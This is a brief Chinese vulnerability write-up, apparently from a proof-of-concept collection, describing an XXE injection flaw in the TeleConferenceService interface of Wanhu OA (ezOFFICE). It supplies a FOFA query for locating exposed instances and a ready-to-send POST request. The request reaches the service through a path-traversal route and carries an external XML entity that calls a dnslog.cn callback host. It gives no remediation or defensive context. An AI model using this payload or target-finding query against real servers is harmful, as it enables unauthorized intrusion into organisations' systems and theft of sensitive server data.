# 万户OA TeleConferenceService XXE注入漏洞

## 漏洞描述

万户OA TeleConferenceService接口存在XXE注入漏洞，攻击者通过漏洞可以继续XXE注入获取服务器敏感信息

## 漏洞影响

```
万户OA
```

## FOFA

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![1](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131048922.png)

验证POC

```
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://fep6kf.dnslog.cn" >]>        
<value>&xxe;</value>
```

![2](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202209131049806.png)